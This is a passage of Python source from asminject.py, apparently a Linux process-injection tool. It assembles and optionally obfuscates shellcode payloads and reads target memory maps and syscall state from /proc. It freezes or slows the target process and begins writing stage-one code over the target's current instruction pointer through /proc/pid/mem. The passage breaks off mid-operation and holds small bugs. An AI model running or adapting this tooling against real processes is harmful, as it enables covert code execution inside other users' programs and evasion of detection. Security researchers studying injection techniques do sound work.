            # log_error(f"Could not find a match for the library base address regular expression '{lname_regex}' in the list of libraries loaded by the target process. Make sure you've targeted the correct process, and that it is compatible with the selected payload.", ansi=injection_params.ansi)
            # return None

    # # Replace relative offset regex matches
    # r_offset_placeholders = []
    # r_offset_placeholders_matches = re.finditer(r'(\[RELATIVEOFFSET:)(.*?)(:RELATIVEOFFSET\])', formatted_source)
    # for match in r_offset_placeholders_matches:
        # r_offset_placeholder_regex = match.group(2)
        # if r_offset_placeholder_regex not in r_offset_placeholders:
            # if injection_params.enable_debugging_output:
                # log(f"Found relative offset regex placeholder '{r_offset_placeholder_regex}' in assembly code", ansi=injection_params.ansi)
            # r_offset_placeholders.append(r_offset_placeholder_regex)
    # for r_symbol_regex in r_offset_placeholders:
        # found_offset_match = False
        # # check explicitly-specified relative offsets first
        # symbol_search_result = get_offset_from_map_by_regex(injection_params, injection_params.relative_offsets, r_symbol_regex)
        # # if a match wasn't found in an explicitly-referenced list, 
        # # and the option is enabled, check the binary itself for symbols/offsets
        # if not symbol_search_result:
            # if injection_params.relative_offsets_from_binaries:
                # for binary_path in placeholder_match_binary_paths:
                    # if not symbol_search_result:
                        # symbol_search_result = get_offset_from_map_by_regex(injection_params, get_elf_symbol_to_offset_map(binary_path), r_symbol_regex)
        # if symbol_search_result:
            # found_offset_match = True
            # log(f"Using '{symbol_search_result[0]}' for relative offset regex placeholder '{r_symbol_regex}' in assembly code", ansi=injection_params.ansi)
            # replacements[f"[RELATIVEOFFSET:{r_symbol_regex}:RELATIVEOFFSET]"] = f"{hex(symbol_search_result[1])}"
        # else:
            # log_error(f"Could not find a match for the relative offset regular expression '{r_symbol_regex}' in the list of relative offsets provided to asminject.py. Make sure you've targeted the correct process, and provided accurate lists of any necessary relative offsets for the process.", ansi=injection_params.ansi)
            # return None
    
    pre_obfuscation_source = formatted_source
    write_source_to_file(injection_params, pre_obfuscation_source, "pre-obfuscation, pre-variable-replacement", f"{file_name_suffix}-pre-obfuscation-pre-replacement")

    obfuscation_iteration = 1
    if injection_params.obfuscate_payloads:
        for i in range(0, injection_params.obfuscation_iterations):
            formatted_source = obfuscate_assembly_source(injection_params, formatted_source, obfuscation_iteration)
            write_source_to_file(injection_params, formatted_source, f"obfuscation round {i + 1}", f"{file_name_suffix}-obfuscation-{i + 1}")
            if injection_params.enable_debugging_output:
                if injection_params.obfuscation_iterations > 1:
                    log(f"Formatted assembly code after obfuscation round {i + 1}:\n{formatted_source}", ansi=injection_params.ansi)

    write_source_to_file(injection_params, formatted_source, "post-obfuscation, pre-variable-replacement", f"{file_name_suffix}-post-obfuscation-pre-replacement")

    for search_text in replacements.keys():
        formatted_source = formatted_source.replace(search_text, replacements[search_text])
        if injection_params.obfuscate_payloads:
            pre_obfuscation_source = pre_obfuscation_source.replace(search_text, replacements[search_text])
    
    # check for any remaining placeholders in the formatted source code
    # placeholder_types = ['BASEADDRESS', 'RELATIVEOFFSET', 'VARIABLE']
    placeholder_types = ['SYMBOL_ADDRESS', 'VARIABLE']
    missing_values = []
    for pht in placeholder_types:
        missing_placeholders_matches = re.finditer(r'(\[' + pht + ':)(.*?)(:' + pht + '\])', formatted_source)
        for match in missing_placeholders_matches:
            missing_string = match.group(0)
            if missing_string not in missing_values:
                missing_values.append(missing_string)
    
    #if injection_params.enable_debugging_output:
    #    log(f"Formatted assembly code:\n{pre_obfuscation_source}", ansi=injection_params.ansi)
    
    if injection_params.obfuscate_payloads:
        if injection_params.enable_debugging_output:
            log(f"Formatted assembly code before obfuscation:\n{pre_obfuscation_source}", ansi=injection_params.ansi)
            log(f"Formatted assembly code after obfuscation:\n{formatted_source}", ansi=injection_params.ansi)
        write_source_to_file(injection_params, pre_obfuscation_source, f"pre-obfuscation, post-variable-replacement", f"{file_name_suffix}-pre-obfuscation-post-replacement")
    else:
        if injection_params.enable_debugging_output:
            log(f"Formatted assembly code:\n{formatted_source}", ansi=injection_params.ansi)
    write_source_to_file(injection_params, formatted_source, f"finalized", f"{file_name_suffix}-finalized")
    
    if len(missing_values) > 0:
        log_error(f"The following placeholders in the assembly source code code not be found: {missing_values}", ansi=injection_params.ansi)
        return None

    result = None

    try:
        out_path = injection_params.create_empty_temp_file(subdirectory_name = injection_params.payload_assembly_subdirectory_name, suffix = ".o")
        # # output file is chmodded 0777 so that the target process' user account can delete it if necessary as well as reading it
        # try:
            # os.chmod(out_path, stat.S_IRWXU | stat.S_IRWXG | stat.S_IRWXO)
        # except Exception as e:
            # log_warning(f"Couldn't set permissions on '{out_path}': {e}", ansi=injection_params.ansi)
        
        #out_path = f"/tmp/assembled_{os.urandom(8).hex()}.bin"
        #cmd = "gcc -x assembler - -o {0} -nostdlib -Wl,--oformat=binary -m64 -fPIC".format()
        # the objcopy workaround isn't necessary on Debian-derived x86-64 Linux distributions
        # but it turns out that it *is* required on e.g. OpenSUSE, so I guess we'll just always use it.
        #use_objcopy_workaround = False
        use_objcopy_workaround = True
        
        #argv = ["gcc", "-x", "assembler", "-", "-o", out_path, "-nostdlib", "-Wl,--oformat=binary", "-m64", "-fPIC"]
        argv = ["gcc", "-x", "assembler", "-", "-o", out_path, "-nostdlib", "-fPIC", "-Wl,--build-id=none", "-m64", "-s"]
        
        # ARM gcc doesn't support the raw binary output format, and there is a similar issue with x86
        # it's necessary to pass -Wl,--build-id=none so 
        # that the linker doesn't include metadata that objcopy will misinterpret later
        # same for the -s option: including the debugging metadata causes objcopy to output a file with a huge
        # amount of empty space in it
        if injection_params.architecture == "x86":
            argv = ["gcc", "-x", "assembler", "-", "-o", out_path, "-nostdlib", "-fPIC", "-Wl,--build-id=none", "-m32", "-s"]
            use_objcopy_workaround = True
            
        if injection_params.architecture == "arm32":
            argv = ["gcc", "-x", "assembler", "-", "-o", out_path, "-nostdlib", "-fPIC", "-Wl,--build-id=none", "-s"]
            #argv = ["gcc", "-x", "assembler", "-", "-o", out_path, "-nostdlib", "-fPIC", "-pie", "-Wl,--build-id=none", "-s"]
            use_objcopy_workaround = True

        program = formatted_source.encode()
        # if injection_params.write_assembly_source_to_disk:
            # try:
                # in_path = injection_params.create_empty_temp_file(subdirectory_name = injection_params.payload_assembly_subdirectory_name, suffix = ".s")
                # log(f"Writing assembly source to '{in_path}'", ansi=injection_params.ansi)
                # with open(in_path, "w") as source_code_file:
                    # source_code_file.write(formatted_source)
            # except Exception as e:
                # log_error(f"Couldn't write assembly source to '{in_path}': {e}", ansi=injection_params.ansi)
        # if injection_params.enable_debugging_output:
            # log(f"Writing assembled binary to '{out_path}'", ansi=injection_params.ansi)
        
        pipe = subprocess.PIPE

        if injection_params.enable_debugging_output:
            log(f"Assembler command: {argv}", ansi=injection_params.ansi)
        result = subprocess.run(argv, stdout=pipe, stderr=pipe, input=program)
        
        assembler_console_output = f"stdout:\n\n{result.stdout.decode().strip()}\n\nstderr:\n\n{result.stderr.decode().strip()}"
        if result.returncode == 0:
            if injection_params.enable_debugging_output:
                log(f"Assembler output: \n\n{assembler_console_output}", ansi=injection_params.ansi)
        else:
            #emsg = result.stderr.decode().strip()
            #log_error("Assembler command failed:\n\t" + emsg.replace("\n", "\n\t"), ansi=injection_params.ansi)
            log_error("Assembler command failed:\n\n" + assembler_console_output, ansi=injection_params.ansi)
            return None
        
        # ld for ARM won't emit raw binaries like it will for x86-64
        # and a similar issues needs to be worked around for x86
        if use_objcopy_workaround:
            argv = []
        
            try:
                obj_out_path = injection_params.create_empty_temp_file(subdirectory_name = injection_params.payload_assembly_subdirectory_name, suffix = ".o")
                try:
                    os.chmod(obj_out_path, stat.S_IRWXU | stat.S_IRWXG | stat.S_IRWXO)
                except Exception as e:
                    log_warning(f"Couldn't set permissions on '{obj_out_path}': {e}", ansi=injection_params.ansi)
                log(f"Converting executable '{out_path}' to raw binary file {obj_out_path}", ansi=injection_params.ansi)
                
                if injection_params.architecture == "arm32":
                    argv = ["objcopy", "-O", "binary", out_path, obj_out_path]
                if injection_params.architecture in ["x86", "x86-64"]:
                    argv = ["objcopy", "-O", "binary", "--only-section=.text", out_path, obj_out_path]
                
                if injection_params.enable_debugging_output:
                    log(f"objdump command: {argv}", ansi=injection_params.ansi)
                result = subprocess.run(argv, stdout=pipe, stderr=pipe)
                
                if result.returncode != 0:
                    emsg = result.stderr.decode().strip()
                    log_error("objdump command failed:\n\t" + emsg.replace("\n", "\n\t"), ansi=injection_params.ansi)
                    return None
                
                if injection_params.delete_temp_files:
                    try:
                        os.remove(out_path)
                    except Exception as e:
                        log_error(f"Couldn't delete termporary binary file '{out_path}': {e}", ansi=injection_params.ansi)
                
                out_path = obj_out_path
            except Exception as e:
                log_error(f"Couldn't convert assembler output to raw binary using objdump: {e}", ansi=injection_params.ansi)
                return None
        
    except Exception as e:
        log_error(f"Couldn't assemble code using gcc: {e}", ansi=injection_params.ansi)
        return None
        
    result_code = None
    try:
        if os.path.isfile(out_path):
            with open(out_path, "rb") as assembled_code:
                result_code = assembled_code.read()
    except Exception as e:
        log_error(f"Couldn't read assembled binary '{out_path}': {e}", ansi=injection_params.ansi)
        return None

    if injection_params.delete_temp_files:
        try:
            os.remove(out_path)
        except Exception as e:
            log_error(f"Couldn't delete temporary binary file '{out_path}': {e}", ansi=injection_params.ansi)
    
    return result_code

def output_memory_block_data(injection_params, memory_block_name, memory_block):
    if not injection_params.enable_debugging_output:
        return
    output = f"{memory_block_name}:"
    num_blocks = int(math.ceil(float(len(memory_block)) / float(injection_params.register_size)))
    for block_num in range(0, num_blocks):
        block_data = "0x "
        num_sub_blocks = int(injection_params.register_size / 4)
        for sub_block_num in range(0, num_sub_blocks):
            sub_block_data = ""
            base_byte_num = (block_num * injection_params.register_size) + (sub_block_num * 4)
            for byte_num in range(0, 4):
                current_byte_num = base_byte_num + byte_num
                current_byte_data = 0
                if current_byte_num < len(memory_block):
                    current_byte_data = memory_block[current_byte_num]
                else:
                    current_byte_data = 0
                sub_block_data = f"{sub_block_data}{format(current_byte_data, '02x')}"
            block_data = f"{block_data} {sub_block_data}"
        block_data = block_data.strip()
        output = f"{output}\n\t{block_data}"
    log(output, ansi=injection_params.ansi)

def get_syscall_values(injection_params, pid):
    result = {}
    syscall_data = ""
    syscall_vals = []
    result[injection_params.instruction_pointer_register_name] = 0
    result[injection_params.stack_pointer_register_name] = 0
    result["syscall_data"] = ""
    try:
        with open(f"/proc/{pid}/syscall") as syscall_file:
            syscall_data = syscall_file.read()
            result["syscall_data"] = syscall_data
            syscall_vals = syscall_data.split(" ")
        if " " in syscall_data:
            result[injection_params.instruction_pointer_register_name] = int(syscall_vals[-1][2:], 16)
            result[injection_params.stack_pointer_register_name] = int(syscall_vals[-2][2:], 16)
        else:
            log(f"Couldn't retrieve current syscall values", ansi=injection_params.ansi)
    except Exception as e:
        log_error(f"Couldn't retrieve current syscall values: {e}", ansi=injection_params.ansi)
    return result

def wait_for_payload_communication_state(injection_params, pid, communication_address, wait_for_value):
    done_waiting = False
    data = communication_variables()
    payload_state_communication_address = communication_address + injection_params.communication_address_offset_payload_state
    waiting_for_state_name = injection_params.state_variables.get_state_name_from_value(wait_for_value)
    if injection_params.enable_debugging_output:
        log(f"Waiting for payload state {waiting_for_state_name} at address {hex(payload_state_communication_address)}", ansi=injection_params.ansi)
    while not done_waiting:
        process_memory_path = f"/proc/{pid}/mem"
        sleep_this_iteration = True
        data.read_current_values(injection_params, process_memory_path, communication_address)
        
        if data.payload_state_value == wait_for_value:
            if injection_params.enable_debugging_output:
                log(f"Payload state value matches state {waiting_for_state_name}", ansi=injection_params.ansi)
            sleep_this_iteration = False
            done_waiting = True
            
        if sleep_this_iteration:
            log(f"Waiting for payload to update the state value to {waiting_for_state_name} at address {hex(payload_state_communication_address)}", ansi=injection_params.ansi)
            time.sleep(injection_params.wait_delay)
    return data

def set_script_communication_state(injection_params, pid, communication_address, new_value):
    script_state_communication_address = communication_address + injection_params.communication_address_offset_script_state
    #with open(f"/proc/{injection_params.pid}/mem", "wb+") as mem:
    with open(f"/proc/{injection_params.pid}/mem", "rb+") as mem:
        log(f"Setting script state to {injection_params.state_variables.get_state_name_from_value(new_value)} at {hex(script_state_communication_address)} in target memory", ansi=injection_params.ansi)
        mem.seek(script_state_communication_address)
        packed_val = struct.pack('I', new_value)
        mem.write(packed_val)

def output_process_priority_and_affinity(injection_params, state_name):
    log(f"{state_name} process priority for asminject.py (PID: {injection_params.asminject_pid}) is {injection_params.asminject_priority}", ansi=injection_params.ansi)
    log(f"{state_name} CPU affinity for asminject.py (PID: {injection_params.asminject_pid}) is {injection_params.asminject_affinity}", ansi=injection_params.ansi)
    log(f"{state_name} process priority for target process (PID: {injection_params.pid}) is {injection_params.target_priority}", ansi=injection_params.ansi)
    log(f"{state_name} CPU affinity for target process (PID: {injection_params.pid}) is {injection_params.target_affinity}", ansi=injection_params.ansi)

def set_process_priority_and_affinity(injection_params, asminject_priority, target_priority, asminject_affinity, target_affinity):
    log(f"Setting process priority for asminject.py (PID: {injection_params.asminject_pid}) to {asminject_priority}", ansi=injection_params.ansi)
    injection_params.asminject_process.nice(asminject_priority)
    log(f"Setting process priority for target process (PID: {injection_params.pid}) to {target_priority}", ansi=injection_params.ansi)
    injection_params.target_process.nice(target_priority)
    log(f"Setting CPU affinity for asminject.py (PID: {injection_params.asminject_pid}) to {asminject_affinity}", ansi=injection_params.ansi)
    injection_params.target_process.cpu_affinity(asminject_affinity)
    log(f"Setting CPU affinity for target process (PID: {injection_params.pid}) to {target_affinity}", ansi=injection_params.ansi)
    injection_params.target_process.cpu_affinity(target_affinity)

def back_up_memory_region(injection_params, map_entry, subdirectory_name):
    backup_path = os.path.join(injection_params.temp_file_base_directory, subdirectory_name, f"0x{map_entry.start_address:016x}-0x{map_entry.end_address:016x}.bin")
    with open(backup_path, "wb") as backup_file:
        with open(f"/proc/{injection_params.pid}/mem", "rb") as mem:
            total_size = map_entry.end_address - map_entry.start_address
            read_size = 0
            mem.seek(map_entry.start_address)
            while read_size < total_size:
                current_block_size = injection_params.backup_chunk_size
                remaining_size = total_size - read_size
                if remaining_size < current_block_size:
                    current_block_size = remaining_size
                region_backup_chunk = mem.read(current_block_size)
                backup_file.write(region_backup_chunk)
                read_size += current_block_size
            return backup_path
    return None

def back_up_memory_regions(injection_params, memory_map_data, subdirectory_name):
    # Create a separate container for only the regions that have been backed up
    # (as opposed to the complete list that asminject.py is using for other purposes)
    backed_up_region_data = asminject_memory_map_data()
    exiting_map_data_array = memory_map_data.to_array()
    json_path = injection_params.create_empty_temp_file(subdirectory_name = subdirectory_name, suffix = ".json")
    backed_up_region_data.backup_directory = os.path.dirname(json_path)
    
    for arr_entry in exiting_map_data_array:
        new_entry = memory_map_entry.from_dictionary(arr_entry)
        add_entry = False
        region_description_string = new_entry.get_description_string()
        # Only continue processing the current region
        # if all memory regions are being backed up/restored
        # or its path/name matches a user-supplied regex
        if injection_params.restore_all_memory_regions:
            if injection_params.enable_debugging_output:
                log(f"Tenatively including memory region {region_description_string} in backup because the user selected backup/restore for all regions", ansi=injection_params.ansi)
            add_entry = True

        if not add_entry:
            for rmr_rex in injection_params.restore_memory_region_regexes:
                if e.search(rmr_rex, new_entry.path):
                    if injection_params.enable_debugging_output:
                        log(f"Tenatively including memory region {region_description_string} in backup because its path matches the regular expression '{rmr_rex}'", ansi=injection_params.ansi)
                    add_entry = True
                    break

        # Don't back up/restore anything on the internal ignore list
        if add_entry:
            if new_entry.path in injection_params.internal_memory_region_restore_ignore_list:
                if injection_params.enable_debugging_output:
                    log(f"Removing memory region {region_description_string} from backup candidates because its path matches an internal ignore list entry", ansi=injection_params.ansi)
                add_entry = False

        # Don't back up/restore asminject.py's own memory regions
        if add_entry:
            if new_entry.start_address == injection_params.existing_read_execute_address:
                if injection_params.enable_debugging_output:
                    log(f"Removing memory region {region_description_string} from backup candidates because its start address matches the existing read/execute block address", ansi=injection_params.ansi)
                add_entry = False
            if new_entry.start_address == injection_params.existing_read_write_address:
                if injection_params.enable_debugging_output:
                    log(f"Removing memory region {region_description_string} from backup candidates because its start address matches the existing read/write block address", ansi=injection_params.ansi)
                add_entry = False

        if add_entry:
            if injection_params.enable_debugging_output:
                log(f"Attempting to back up memory region {region_description_string}", ansi=injection_params.ansi)
            try:
                backup_path = back_up_memory_region(injection_params, new_entry, subdirectory_name)
                if backup_path:
                    log_success(f"Backed up the memory region {region_description_string}", ansi=injection_params.ansi)
                    new_entry.backup_path = backup_path
                else:
                    log_error(f"Backup of memory region {region_description_string} failed unexpectedly", ansi=injection_params.ansi)
            except Exception as e:
                log_error(f"Couldn't back up the memory region {region_description_string}: {e}", ansi=injection_params.ansi)
            backed_up_region_data.add_entry(injection_params, new_entry)
    
    # Also save a JSON version of the backed-up region list
    with open(json_path, "w") as json_file:
        json_file.write(backed_up_region_data.to_json())
    
    return backed_up_region_data


def restore_memory_region(injection_params, region_entry):
    region_description_string = region_entry.get_description_string()
    if injection_params.enable_debugging_output:
        log(f"Attempting to restore memory region {region_description_string}", ansi=injection_params.ansi)
    with open(region_entry.backup_path, "rb") as backup_file:
        #with open(f"/proc/{injection_params.pid}/mem", "wb+") as mem:
        with open(f"/proc/{injection_params.pid}/mem", "rb+") as mem:
            total_size = region_entry.end_address - region_entry.start_address
            read_size = 0
            mem.seek(region_entry.start_address)
            while read_size < total_size:
                current_block_size = injection_params.backup_chunk_size
                remaining_size = total_size - read_size
                if remaining_size < current_block_size:
                    current_block_size = remaining_size
                region_backup_chunk = backup_file.read(current_block_size)
                mem.write(region_backup_chunk)
                read_size += current_block_size

def restore_memory_regions(injection_params, backed_up_memory_map_data):
    for mr in backed_up_memory_map_data.to_array():
        mem_region = memory_map_entry.from_dictionary(mr)
        region_description_string = mem_region.get_description_string()
        try:
            restore_memory_region(injection_params, mem_region)
        except Exception as e:
            log_error(f"Couldn't restore the memory region {region_description_string}: {e}", ansi=injection_params.ansi)

def get_ring_populated_array(array_length, byte_array_to_populate_with):
    result = []
    while len(result) < array_length:
        for b in byte_array_to_populate_with:
            result.append(b)
    if len(result) >= array_length:
        result = result[0:array_length]
    return result

def asminject(injection_params):
    log(f"Starting at {injection_params.get_timestamp_string()} (UTC)", ansi=injection_params.ansi)
    map_file_path = injection_params.get_map_file_path()
    if not os.path.isfile(map_file_path):
        log_error(f"Could not find the memory map pseudofile '{map_file_path}' - please verify that you have specified a valid process ID", ansi=injection_params.ansi)
        sys.exit(1)

    stage1 = None
    
    stage1_source_filename = "stage1-memory.s"
    stage1_path = os.path.join(injection_params.base_script_path, "asm", injection_params.architecture, stage1_source_filename)
    if not os.path.isfile(stage1_path):
        log_error(f"Could not find the stage 1 source code '{stage1_path}'", ansi=injection_params.ansi)
        sys.exit(1)
        
    stage2_template_source_filename = "stage2-template.s"
    stage2_template_source_path = os.path.join(injection_params.base_script_path, "asm", injection_params.architecture, stage2_template_source_filename)
    if not os.path.isfile(stage2_template_source_path):
        log_error(f"Could not find the stage 2 template source code '{stage2_template_source_path}'", ansi=injection_params.ansi)
        sys.exit(1)

    if not os.path.isfile(injection_params.asm_path):
        log_error(f"Could not find the stage 2 shellcode file '{injection_params.asm_path}'", ansi=injection_params.ansi)
        sys.exit(1)
        
    if injection_params.precompiled_shellcode:
        if not os.path.isfile(injection_params.precompiled_shellcode):
            log_error(f"Could not find the precompiled binary shellcode file '{injection_params.precompiled_shellcode}'", ansi=injection_params.ansi)
            sys.exit(1)
    
    memory_map_data = asminject_memory_map_data()
    memory_map_data.load_memory_map_data(injection_params)
    library_names = []
    for lname in memory_map_data.get_unique_path_names():
        library_names.append(lname)
    library_names.sort()
    for lname in library_names:
        log(f"{lname}: {hex(memory_map_data.get_first_region_for_named_file(lname).get_base_address())}", ansi=injection_params.ansi)

    # Do basic setup first to perform a validation on the stage 2 code
    # (Avoids injecting stage 1 only to have stage 2 fail)
    injection_params.stack_region = memory_map_data.get_first_region_for_named_file("[stack]")
    injection_params.set_initial_communication_address()

    stage2_replacements = injection_params.get_replacement_variable_map(placeholder_value_address = injection_params.get_base_communication_address())

    stage2_source_code = ""
    shellcode_source_code = ""
    try:
        with open(stage2_template_source_path, "r") as asm_source_code_file:
            stage2_source_code = asm_source_code_file.read()
    except Exception as e:
        log_error(f"Couldn't read the stage 2 template source code file '{stage2_template_source_path}': {e}", ansi=injection_params.ansi)
        sys.exit(1)
    
    #if injection_params.clear_payload_memory_after_execution:
    #    stage2_source_code = stage2_source_code.replace("[CLEAR_RW_MEMORY]", get_code_fragment(injection_params, "stage2-overwrite_read-write.s"))
    #else:
    #    stage2_source_code = stage2_source_code.replace("[CLEAR_RW_MEMORY]", "")

    if injection_params.deallocate_memory:
        stage2_source_code = stage2_source_code.replace("[DEALLOCATE_MEMORY]", get_code_fragment(injection_params, "stage2-deallocate.s"))
    else:
        log_warning(f"Memory allocated by the staging code will not be deallocated after the payload executes", ansi=injection_params.ansi)
        stage2_source_code = stage2_source_code.replace("[DEALLOCATE_MEMORY]", "")
    
    try:
        with open(injection_params.asm_path, "r") as shellcode_source_code_file:
            shellcode_source_code = shellcode_source_code_file.read()
    except Exception as e:
        log_error(f"Couldn't read the stage 2 template source code file '{injection_params.asm_path}': {e}", ansi=injection_params.ansi)
        sys.exit(1)
    
    shellcode_source_code_split = shellcode_source_code.split(injection_params.shellcode_section_delimiter)
    
    stage2_source_code = stage2_source_code.replace('[VARIABLE:SHELLCODE_SOURCE:VARIABLE]', shellcode_source_code_split[0])
    
    shellcode_data_section = ""
    if len(shellcode_source_code_split) > 1:
        shellcode_data_section = shellcode_source_code_split[1]

    if injection_params.precompiled_shellcode:
        try:
            with open(injection_params.precompiled_shellcode, "rb") as precompiled_shellcode_file:
                precompiled_payload = precompiled_shellcode_file.read()
                precompiled_shellcode_as_hex = ""
                for byte_num in range(0, len(precompiled_payload)):
                    if byte_num == 0:
                        precompiled_shellcode_as_hex = f"{hex(precompiled_payload[byte_num])}"
                    else:
                        precompiled_shellcode_as_hex = f"{precompiled_shellcode_as_hex}, {hex(precompiled_payload[byte_num])}"
                
                shellcode_as_inline_bytes = f"{injection_params.precompiled_shellcode_label}:\n\t.byte {precompiled_shellcode_as_hex}\n\t.balign 16\n\n"
                if shellcode_data_section == "":
                    stage2_source_code = stage2_source_code.replace(injection_params.inline_shellcode_placeholder, shellcode_as_inline_bytes)
                else:
                    shellcode_data_section = shellcode_data_section.replace(injection_params.inline_shellcode_placeholder, shellcode_as_inline_bytes)
                    
        except Exception as e:
            log_error(f"Couldn't read and embed the precompiled shellcode file '{injection_params.precompiled_shellcode}': {e}", ansi=injection_params.ansi)
            sys.exit(1)

    stage2_source_code = stage2_source_code.replace('[VARIABLE:SHELLCODE_DATA:VARIABLE]', shellcode_data_section)

    log("Validating ability to assemble stage 2 code", ansi=injection_params.ansi)
    if injection_params.existing_stage_2_source:
        try:
            with open(injection_params.existing_stage_2_source, "r") as existing_code_file:
                stage2_source_code = existing_code_file.read()
        except Exception as e:
            log_error(f"Couldn't read the existing stage 2 source code file '{injection_params.existing_stage_2_source}': {e}", ansi=injection_params.ansi)
            sys.exit(1)
    stage2 = assemble(stage2_source_code, injection_params, memory_map_data, "-stage_2-check_build", replacements=stage2_replacements)
    
    # make sure that the read/execute block will be big enough to hold the payload
    if not stage2:
        log_error(f"Failed to assemble the selected payload. Rerun with --debug for additional information.", ansi=injection_params.ansi)
        sys.exit(1)
        
    stage2_real_size = len(stage2)
    
    if injection_params.read_execute_region_size < stage2_real_size:
        existing_rx_block_size = injection_params.read_execute_region_size
        injection_params.read_execute_region_size = stage2_real_size
        if (injection_params.read_execute_region_size % injection_params.allocation_unit_size) > 0:
            while (injection_params.read_execute_region_size % injection_params.allocation_unit_size) > 0:
                injection_params.read_execute_region_size += 1
        if injection_params.existing_read_execute_address:
            log_error(f"The selected payload is too large to fit into the existing read/execute block. It would require a block size of {hex(injection_params.read_execute_region_size)} bytes, but the existing block is only {hex(existing_rx_block_size)} bytes", ansi=injection_params.ansi)
            sys.exit(1)
        else:
            log_warning(f"Increased read/execute block size to {hex(injection_params.read_execute_region_size)} due to the size of the payload", ansi=injection_params.ansi)
                           
    if not stage2:
        log_error(f"Validation assembly of stage 2 failed. Please verify that all required parameters and offset lists have been provided. Rerun with --debug for additional information.'", ansi=injection_params.ansi)
        sys.exit(1)
    log("Validation assembly of stage 2 succeeded", ansi=injection_params.ansi)

    if injection_params.stop_method == "sigstop":
        log("Sending SIGSTOP", ansi=injection_params.ansi)
        os.kill(injection_params.pid, signal.SIGSTOP)
        while True:
            with open(f"/proc/{injection_params.pid}/stat") as stat_file:
                state = stat_file.read().split(" ")[2]
            if state in ["T", "t"]:
                break
            log("Waiting for process to stop", ansi=injection_params.ansi)
            time.sleep(0.1)
    elif injection_params.stop_method == "cgroup_freeze":
        log(f"Freezing process {injection_params.pid} using directory {injection_params.freeze_dir}", ansi=injection_params.ansi)
        os.mkdir(injection_params.freeze_dir)
        with open(injection_params.freeze_dir + "/tasks", "w") as task_file:
            task_file.write(str(injection_params.pid))
        with open(injection_params.freeze_dir + "/freezer.state", "w") as state_file:
            state_file.write("FROZEN\n")
        while True:
            with open(injection_params.freeze_dir + "/freezer.state") as state_file:
                if state_file.read().strip() == "FROZEN":
                    break
            log("Waiting for process to freeze", ansi=injection_params.ansi)
            time.sleep(0.1)
        log("Process is frozen", ansi=injection_params.ansi)
    elif injection_params.stop_method == "slow":
        log("Switching to super slow motion, like every late 1990s/early 2000s action film director did after seeing _The Matrix_...", ansi=injection_params.ansi)
        try:
            injection_params.set_dynamic_process_info_vars()
            
            output_process_priority_and_affinity(injection_params, "Initial")
        except Exception as e:
            log_error(f"Couldn't get process information for slowing: {e}", ansi=injection_params.ansi)
            sys.exit(1)  
        try:
            set_process_priority_and_affinity(injection_params, injection_params.high_priority_nice, injection_params.low_priority_nice, injection_params.shared_affinity, injection_params.shared_affinity)
            injection_params.set_dynamic_process_info_vars()
            output_process_priority_and_affinity(injection_params, "Pre-injection")

        except Exception as e:
            log_error(f"Couldn't set process information for 'slow' mode: {e}", ansi=injection_params.ansi)
            sys.exit(1)
    else:
        log.warn("We're not going to stop the process first!", ansi=injection_params.ansi)

    stack_backup_address = 0
    code_backup_address = 0

    stack_backup = b''
    code_backup = b''
    communication_address_backup = b''
    current_state = None
    memory_region_backup = None
    
    continue_executing = True
    try:
        got_initial_syscall_data = False
        syscall_check_result = None
        while not got_initial_syscall_data:
            syscall_check_result = get_syscall_values(injection_params, injection_params.pid)
            injection_params.saved_instruction_pointer_value = syscall_check_result[injection_params.instruction_pointer_register_name]
            injection_params.saved_stack_pointer_value = syscall_check_result[injection_params.stack_pointer_register_name]
            if injection_params.saved_instruction_pointer_value == 0 or injection_params.saved_stack_pointer_value == 0:
                log_error("Couldn't get current syscall data", ansi=injection_params.ansi)
                time.sleep(injection_params.sleep_time_waiting_for_syscalls)
            else:
                got_initial_syscall_data = True
        log(f"{injection_params.instruction_pointer_register_name}: {hex(injection_params.saved_instruction_pointer_value)}", ansi=injection_params.ansi)
        log(f"{injection_params.stack_pointer_register_name}: {hex(injection_params.saved_stack_pointer_value)}", ansi=injection_params.ansi)
        
        if continue_executing:
            log(f"Using: {hex(injection_params.state_variables.state_map['ready_for_stage_two_write'])} for 'ready for stage two write' state value", ansi=injection_params.ansi)
            log(f"Using: {hex(injection_params.state_variables.state_map['stage_two_written'])} for 'stage two written' state value", ansi=injection_params.ansi)
            
            stage_1_code = ""
            with open(stage1_path, "r") as stage1_code:
                stage_1_code = stage1_code.read()
            
            if injection_params.existing_read_execute_address:
                injection_params.read_execute_region_address = injection_params.existing_read_execute_address
                log_warning(f"Attempting to reuse existing read/execute block at {hex(injection_params.read_execute_region_address)}")
                stage_1_code = stage_1_code.replace("[READ_EXECUTE_ALLOCATE_OR_REUSE]", get_code_fragment(injection_params, "stage1-use_existing_read-execute.s"))
            else:
                stage_1_code = stage_1_code.replace("[READ_EXECUTE_ALLOCATE_OR_REUSE]", get_code_fragment(injection_params, "stage1-allocate_read-execute.s"))
            if injection_params.existing_read_write_address:
                injection_params.read_write_region_address = injection_params.existing_read_write_address
                log_warning(f"Attempting to reuse existing read/write block at {hex(injection_params.read_write_region_address)}")
                stage_1_code = stage_1_code.replace("[READ_WRITE_ALLOCATE_OR_REUSE]", get_code_fragment(injection_params, "stage1-use_existing_read-write.s"))
            else:
                stage_1_code = stage_1_code.replace("[READ_WRITE_ALLOCATE_OR_REUSE]", get_code_fragment(injection_params, "stage1-allocate_read-write.s"))

            stage1_replacements = injection_params.get_replacement_variable_map()
            
            if injection_params.existing_stage_1_source:
                try:
                    with open(injection_params.existing_stage_1_source, "r") as existing_code_file:
                        stage1_code = existing_code_file.read()
                except Exception as e:
                    log_error(f"Couldn't read the existing stage 1 source code file '{injection_params.existing_stage_1_source}': {e}", ansi=injection_params.ansi)
                    sys.exit(1)
            
            stage1 = assemble(stage_1_code, injection_params, memory_map_data, "-stage_1", replacements=stage1_replacements)

            if not stage1:
                continue_executing = False
                log_error("Assembly of stage 1 failed - will not attempt to inject into process", ansi=injection_params.ansi)
            else:
            
                memory_region_backup = back_up_memory_regions(injection_params, memory_map_data, injection_params.memory_region_backup_subdirectory_name)
                if injection_params.enable_debugging_output:
                    log(f"Created the pre-injection memory region backup in '{memory_region_backup.backup_directory}'", ansi=injection_params.ansi)
                try:
                    mem_file_path = f"/proc/{injection_params.pid}/mem"
                    #with open(mem_file_path, "wb+") as mem:
                    with open(mem_file_path, "rb+") as mem:
                        # back up the code we're about to overwrite
                        code_backup_address = injection_params.saved_instruction_pointer_value
                        code_backup = None
                        try:
                            mem.seek(code_backup_address)
                            code_backup = mem.read(len(stage1))
                        except Exception as e:
